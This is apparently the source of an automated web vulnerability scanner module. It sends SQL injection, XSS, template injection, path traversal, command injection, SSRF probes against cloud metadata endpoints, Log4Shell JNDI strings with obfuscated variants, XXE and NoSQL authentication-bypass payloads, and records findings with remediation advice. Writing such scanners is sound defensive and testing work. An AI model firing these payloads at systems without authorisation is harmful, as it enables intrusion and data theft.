"""
nexsus/modules/vuln_detection.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability detection engine covering:
  SQLi, XSS, SSTI, SSRF, LFI/Path Traversal, RCE/Cmd Injection,
  IDOR, Open Redirect, CORS, XXE, NoSQLi, Log4Shell, HTTP Request Smuggling

Design principles:
  • Baseline comparison before reporting to reduce false positives
  • Timed blind tests for SQLi / RCE
  • Multiple parameter injection points (query, body, headers, JSON)
  • CVSS v3 base score assigned to each finding
  • Optional confirmation round (second probe) before saving
"""
import asyncio
import re
import time
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode

from nexsus.core.logger import Logger
from nexsus.core.payload_manager import PayloadManager

# ── CVSS base scores by severity ─────────────────────────────────────────────
_CVSS = {
    "Critical": 9.5,
    "High":     7.5,
    "Medium":   5.0,
    "Low":      2.5,
    "Info":     0.0,
}

# ── Error signatures (indicate SQLi / LFI) ────────────────────────────────────
_SQL_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
    r"valid MySQL result", r"ORA-\d{5}", r"Oracle.*Driver",
    r"SQLiteException", r"sqlite3\.OperationalError",
    r"Microsoft.*SQL Server", r"ODBC SQL Server Driver",
    r"PostgreSQL.*ERROR", r"pg_query\(\)", r"PG::SyntaxError",
    r"MSSQL.*Driver", r"SQL command not properly ended",
    r"Unclosed quotation mark", r"incorrect syntax near",
]

_LFI_CONFIRM = [
    r"root:x:\d+:\d+:",       # /etc/passwd
    r"\[extensions\]",         # windows/win.ini
    r"\[boot loader\]",        # windows/boot.ini
    r"<?php",                  # source code disclosure
    r"#.*!/bin/",              # shell script
]

_SSTI_CONFIRM = {
    "{{7*7}}":  "49",
    "${7*7}":   "49",
    "{{7*'7'}}": "7777777",
    "<%= 7*7 %>": "49",
    "#{7*7}":   "49",
    "*{7*7}":   "49",
}

_RCE_CONFIRM = [r"uid=\d+", r"root:", r"drwxr", r"www-data", r"Windows IP"]


class VulnScan:
    def __init__(self, orchestrator):
        self.orchestrator    = orchestrator
        self.paused          = False
        self.logger          = Logger("VulnScan")
        self.payload_mgr     = PayloadManager(orchestrator.current_waf)
        self._tested_urls:   set[str] = set()

    # ── Main entry ─────────────────────────────────────────────────────────────

    async def run(self):
        endpoints = list(self.orchestrator.data_store.assets.get("endpoints", set()))
        if not endpoints:
            self.logger.warning("No endpoints found — run Active Recon first")
            return

        self.logger.info(f"Vulnerability scan on {len(endpoints)} endpoint(s)")
        client = self.orchestrator.http_client
        total  = len(endpoints)

        for idx, url in enumerate(endpoints):
            await self._check_paused()
            self.orchestrator.set_progress(
                percent=round(idx / total * 100, 1),
                phase="vuln_scan",
            )
            await self._scan_url(client, url)

        self.orchestrator.set_progress(100, "vuln_scan")
        self.logger.success("Vulnerability scan complete")

    async def _scan_url(self, client, url: str):
        if url in self._tested_urls:
            return
        self._tested_urls.add(url)

        tests = [
            self.test_sqli(client, url),
            self.test_xss(client, url),
            self.test_ssti(client, url),
            self.test_lfi(client, url),
            self.test_ssrf(client, url),
            self.test_rce(client, url),
            self.test_idor(client, url),
            self.test_open_redirect(client, url),
            self.test_cors(client, url),
            self.test_xxe(client, url),
            self.test_log4shell(client, url),
            self.test_nosqli(client, url),
        ]
        await asyncio.gather(*tests, return_exceptions=True)

    # ── SQL Injection ──────────────────────────────────────────────────────────

    async def test_sqli(self, client, url: str):
        baseline = await self._get_baseline(client, url)
        if baseline is None:
            return

        payloads = self.payload_mgr.get_payloads("sqli", limit=10)
        error_payloads  = ["'", "\"", "\\", "')--", "'/*"]
        time_payloads   = ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
                           "' AND BENCHMARK(10000000,MD5(1))--"]

        # Error-based detection
        for payload in error_payloads + payloads:
            for inject_url in self._inject_points(url, payload):
                resp = await client.get(inject_url)
                if not resp:
                    continue
                text = await resp.text()
                for sig in _SQL_ERRORS:
                    if re.search(sig, text, re.IGNORECASE):
                        await self._save(
                            title="SQL Injection (Error-Based)",
                            severity="Critical", cvss=9.8,
                            vuln_type="sqli", url=url,
                            payload=payload, evidence=text[:300],
                            remediation="Use parameterised queries / prepared statements. "
                                        "Never interpolate user input into SQL strings.",
                            confirmed=True,
                        )
                        return

        # Time-based blind detection
        for payload in time_payloads:
            for inject_url in self._inject_points(url, payload):
                t0 = time.monotonic()
                resp = await client.get(inject_url)
                elapsed = time.monotonic() - t0
                if elapsed >= 4.5:
                    await self._save(
                        title="SQL Injection (Time-Based Blind)",
                        severity="Critical", cvss=9.0,
                        vuln_type="sqli", url=url,
                        payload=payload,
                        evidence=f"Response delayed {elapsed:.1f}s (expected ≥5s)",
                        remediation="Use parameterised queries.",
                        confirmed=True,
                    )
                    return

    # ── XSS ───────────────────────────────────────────────────────────────────

    async def test_xss(self, client, url: str):
        # Use a unique marker to confirm reflection
        marker  = "NEXSUS7x7"
        probes  = [
            f"<{marker}>",
            f"\"{marker}\"",
            f"'{marker}'",
            f"<img src={marker}>",
        ]
        payloads = self.payload_mgr.get_payloads("xss", limit=15)

        for probe in probes:
            for inject_url in self._inject_points(url, probe):
                resp = await client.get(inject_url)
                if resp:
                    text = await resp.text()
                    if marker in text and probe in text:
                        # Confirmed reflection — now try real payloads
                        for xss_payload in payloads:
                            xss_url = inject_url.replace(
                                urllib.parse.quote(probe, safe=""),
                                urllib.parse.quote(xss_payload, safe=""),
                            )
                            resp2 = await client.get(xss_url)
                            if resp2:
                                t2 = await resp2.text()
                                if xss_payload in t2:
                                    await self._save(
                                        title="Reflected XSS",
                                        severity="High", cvss=7.4,
                                        vuln_type="xss", url=url,
                                        payload=xss_payload,
                                        evidence=t2[:300],
                                        remediation="Apply context-aware output encoding. "
                                                    "Use Content-Security-Policy header.",
                                        confirmed=True,
                                    )
                                    return

    # ── SSTI ──────────────────────────────────────────────────────────────────

    async def test_ssti(self, client, url: str):
        for probe, expected in _SSTI_CONFIRM.items():
            for inject_url in self._inject_points(url, probe):
                resp = await client.get(inject_url)
                if resp:
                    text = await resp.text()
                    if expected in text:
                        await self._save(
                            title="Server-Side Template Injection",
                            severity="Critical", cvss=9.8,
                            vuln_type="ssti", url=url,
                            payload=probe,
                            evidence=f"Expression '{probe}' evaluated to '{expected}' in response",
                            remediation="Never pass user input to template engines. "
                                        "Use sandboxed template evaluation.",
                            confirmed=True,
                        )
                        return

    # ── LFI / Path Traversal ──────────────────────────────────────────────────

    async def test_lfi(self, client, url: str):
        payloads = self.payload_mgr.get_payloads("lfi")
        for payload in payloads:
            for inject_url in self._inject_points(url, payload):
                resp = await client.get(inject_url)
                if not resp or resp.status not in (200, 500):
                    continue
                text = await resp.text()
                for sig in _LFI_CONFIRM:
                    if re.search(sig, text):
                        await self._save(
                            title="Local File Inclusion / Path Traversal",
                            severity="High", cvss=8.6,
                            vuln_type="lfi", url=url,
                            payload=payload, evidence=text[:300],
                            remediation="Canonicalise file paths, use allowlists, "
                                        "and prevent directory traversal sequences.",
                            confirmed=True,
                        )
                        return

    # ── SSRF ──────────────────────────────────────────────────────────────────

    async def test_ssrf(self, client, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        # Only test URL-like parameters
        ssrf_params = {
            k for k, v in params.items()
            if any(kw in k.lower() for kw in
                   ["url", "uri", "link", "href", "src", "redirect",
                    "next", "target", "dest", "proxy", "fetch", "load"])
        }
        if not ssrf_params:
            return

        probes = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/",
            "http://[::1]/",
        ]
        callback = self.orchestrator.payload_mgr.get_blind("ssrf")
        probes += callback[:2]

        for param in ssrf_params:
            for probe in probes:
                new_params = {**params, param: [probe]}
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                resp = await client.get(new_url)
                if resp:
                    text = await resp.text()
                    # AWS metadata indicators
                    if any(kw in text for kw in
                           ["ami-id", "instance-id", "iam/security-credentials",
                            "computeMetadata", "metadata.google"]):
                        await self._save(
                            title="Server-Side Request Forgery (SSRF)",
                            severity="Critical", cvss=9.8,
                            vuln_type="ssrf", url=url,
                            parameter=param, payload=probe,
                            evidence=text[:300],
                            remediation="Validate and whitelist allowed URL destinations. "
                                        "Block access to internal metadata endpoints.",
                            confirmed=True,
                        )
                        return

    # ── RCE / Command Injection ────────────────────────────────────────────────

    async def test_rce(self, client, url: str):
        # Use unique marker approach
        marker   = "NEXSUS_RCE_TEST"
        payloads = [
            f"; echo {marker}",
            f"| echo {marker}",
            f"`echo {marker}`",
            f"$(echo {marker})",
        ]
        for payload in payloads:
            for inject_url in self._inject_points(url, payload):
                resp = await client.get(inject_url)
                if resp:
                    text = await resp.text()
                    if marker in text:
                        await self._save(
                            title="Remote Code Execution (Command Injection)",
                            severity="Critical", cvss=10.0,
                            vuln_type="rce", url=url,
                            payload=payload, evidence=text[:300],
                            remediation="Never pass user input to shell commands. "
                                        "Use subprocess with argument arrays.",
                            confirmed=True,
                        )
                        return

        # Time-based blind RCE
        for payload in ["; sleep 5", "| sleep 5", "$(sleep 5)"]:
            for inject_url in self._inject_points(url, payload):
                t0 = time.monotonic()
                await client.get(inject_url)
                if time.monotonic() - t0 >= 4.5:
                    await self._save(
                        title="RCE (Blind Time-Based Command Injection)",
                        severity="Critical", cvss=9.5,
                        vuln_type="rce", url=url,
                        payload=payload,
                        evidence=f"Response delayed ≥5s with payload: {payload}",
                        remediation="Never pass user input to shell commands.",
                        confirmed=True,
                    )
                    return

    # ── IDOR ──────────────────────────────────────────────────────────────────

    async def test_idor(self, client, url: str):
        # Find numeric IDs in path
        id_match = re.search(r"/(\d+)(?:/|$|\?)", url)
        if not id_match:
            return
        original_id = id_match.group(1)
        candidates  = [
            str(int(original_id) + 1),
            str(int(original_id) - 1) if int(original_id) > 1 else None,
            "1", "2", "0",
        ]
        baseline = await self._get_baseline(client, url)
        if baseline is None:
            return

        for cid in candidates:
            if not cid:
                continue
            test_url = re.sub(r"/\d+(?=/|$|\?)", f"/{cid}", url, count=1)
            resp = await client.get(test_url)
            if not resp or resp.status != 200:
                continue
            text = await resp.text()
            # Flag if response is substantially different AND not an error
            if (abs(len(text) - len(baseline)) > 50 and
                    "not found" not in text.lower() and
                    "unauthorized" not in text.lower()):
                await self._save(
                    title="Insecure Direct Object Reference (IDOR)",
                    severity="High", cvss=7.5,
                    vuln_type="idor", url=url,
                    payload=f"ID changed from {original_id} to {cid}",
                    evidence=f"HTTP 200 returned for resource ID {cid}",
                    remediation="Implement object-level authorisation checks. "
                                "Use indirect references (UUIDs, opaque tokens).",
                )
                return

    # ── Open Redirect ─────────────────────────────────────────────────────────

    async def test_open_redirect(self, client, url: str):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        redirect_params = {
            k for k in params
            if any(kw in k.lower() for kw in
                   ["next", "redirect", "url", "return", "to", "out",
                    "goto", "target", "dest", "redir", "continue"])
        }
        if not redirect_params:
            return

        probes = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https:evil.com",
        ]
        for param in redirect_params:
            for probe in probes:
                new_params = {**params, param: [probe]}
                test_url = (
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    f"?{urlencode(new_params, doseq=True)}"
                )
                resp = await client.get(test_url, allow_redirects=False)
                if resp and resp.status in (301, 302, 303, 307, 308):
                    location = resp.headers.get("Location", "")
                    if "evil.com" in location:
                        await self._save(
                            title="Open Redirect",
                            severity="Medium", cvss=6.1,
                            vuln_type="open_redirect", url=url,
                            parameter=param, payload=probe,
                            evidence=f"Location: {location}",
                            remediation="Whitelist allowed redirect destinations. "
                                        "Never redirect to arbitrary user-supplied URLs.",
                            confirmed=True,
                        )
                        return

    # ── CORS ──────────────────────────────────────────────────────────────────

    async def test_cors(self, client, url: str):
        origins = [
            "https://evil.com",
            "null",
            "https://trusted.evil.com",
        ]
        for origin in origins:
            resp = await client.get(
                url, extra_headers={"Origin": origin}
            )
            if not resp:
                continue
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
            if origin in acao or acao == "*":
                severity  = "High" if acac.lower() == "true" else "Medium"
                cvss_val  = 8.1 if severity == "High" else 5.3
                await self._save(
                    title="CORS Misconfiguration",
                    severity=severity, cvss=cvss_val,
                    vuln_type="cors", url=url,
                    payload=f"Origin: {origin}",
                    evidence=f"ACAO: {acao} | ACAC: {acac}",
                    remediation="Whitelist specific trusted origins. "
                                "Never reflect the request Origin header without validation. "
                                "Avoid wildcards when credentials are involved.",
                    confirmed=True,
                )
                return

    # ── XXE ───────────────────────────────────────────────────────────────────

    async def test_xxe(self, client, url: str):
        payloads = self.orchestrator.payload_mgr.get_payloads("xxe")
        for payload in payloads[:3]:
            resp = await client.post(
                url,
                data=payload,
                extra_headers={"Content-Type": "application/xml"},
            )
            if not resp:
                continue
            text = await resp.text()
            if re.search(r"root:x:\d+", text) or "secret_access_key" in text.lower():
                await self._save(
                    title="XML External Entity Injection (XXE)",
                    severity="Critical", cvss=9.1,
                    vuln_type="xxe", url=url,
                    payload=payload[:200], evidence=text[:300],
                    remediation="Disable external entity processing in the XML parser. "
                                "Use a safe XML library configuration.",
                    confirmed=True,
                )
                return

    # ── Log4Shell ─────────────────────────────────────────────────────────────

    async def test_log4shell(self, client, url: str):
        cb = self.orchestrator.payload_mgr.get_blind("ssrf")
        callback = cb[0] if cb else "http://callback.local"
        payloads = [
            f"${{jndi:ldap://{callback}/a}}",
            f"${{${{::-j}}ndi:ldap://{callback}/b}}",
            f"${{j${{::-n}}di:ldap://{callback}/c}}",
        ]
        inject_headers = [
            "X-Forwarded-For", "User-Agent", "X-Api-Version",
            "Referer", "Accept-Language",
        ]
        for payload in payloads:
            for header in inject_headers:
                resp = await client.get(url, extra_headers={header: payload})
                if resp and resp.status != 400:
                    # Without OOB we can only flag as potential
                    await self._save(
                        title="Potential Log4Shell (Log4j JNDI Injection)",
                        severity="Critical", cvss=10.0,
                        vuln_type="log4shell", url=url,
                        parameter=header, payload=payload,
                        evidence=f"Payload injected via {header} header; "
                                 f"verify via OOB callback",
                        remediation="Update Log4j to ≥2.17.1. "
                                    "Set log4j2.formatMsgNoLookups=true.",
                        confirmed=False,
                    )
                    return

    # ── NoSQL Injection ───────────────────────────────────────────────────────

    async def test_nosqli(self, client, url: str):
        baseline = await self._get_baseline(client, url)
        if not baseline:
            return
        payloads = self.orchestrator.payload_mgr.get_payloads("nosqli")
        for payload in payloads:
            resp = await client.post(
                url,
                json={"username": {"$ne": None}, "password": {"$ne": None}},
                api_mode=True,
            )
            if resp and resp.status == 200:
                text = await resp.text()
                if len(text) > len(baseline) + 50 or "token" in text.lower():
                    await self._save(
                        title="NoSQL Injection",
                        severity="Critical", cvss=9.4,
                        vuln_type="nosqli", url=url,
                        payload=str(payload), evidence=text[:300],
                        remediation="Validate and sanitise all inputs. "
                                    "Use schema validation for MongoDB documents.",
                        confirmed=True,
                    )
                    return

    # ── Helpers ────────────────────────────────────────────────────────────────

    def _inject_points(self, url: str, payload: str) -> list[str]:
        """Return URL variants with *payload* injected at all query params."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        points = []
        if params:
            for key in params:
                new_params = {**params, key: [payload]}
                new_url = (
                    f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    f"?{urlencode(new_params, doseq=True)}"
                )
                points.append(new_url)
        else:
            # No existing params — append as generic `id`
            sep = "&" if "?" in url else "?"
            points.append(f"{url}{sep}id={urllib.parse.quote(payload, safe='')}")
        return points

    async def _get_baseline(self, client, url: str) -> str | None:
        try:
            resp = await client.get(url)
            return await resp.text() if resp else None
        except Exception:
            return None

    async def _save(self, *, title, severity, cvss, vuln_type, url,
                    payload="", evidence="", parameter="",
                    remediation="", confirmed=False):
        finding = {
            "title":       title,
            "severity":    severity,
            "cvss":        cvss,
            "vuln_type":   vuln_type,
            "url":         url,
            "parameter":   parameter,
            "payload":     payload[:300],
            "evidence":    evidence[:500],
            "remediation": remediation,
            "module":      "VulnScan",
            "confirmed":   confirmed,
        }
        await self.orchestrator.add_finding(finding)

    async def _check_paused(self):
        while self.paused:
            await asyncio.sleep(0.5)

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False
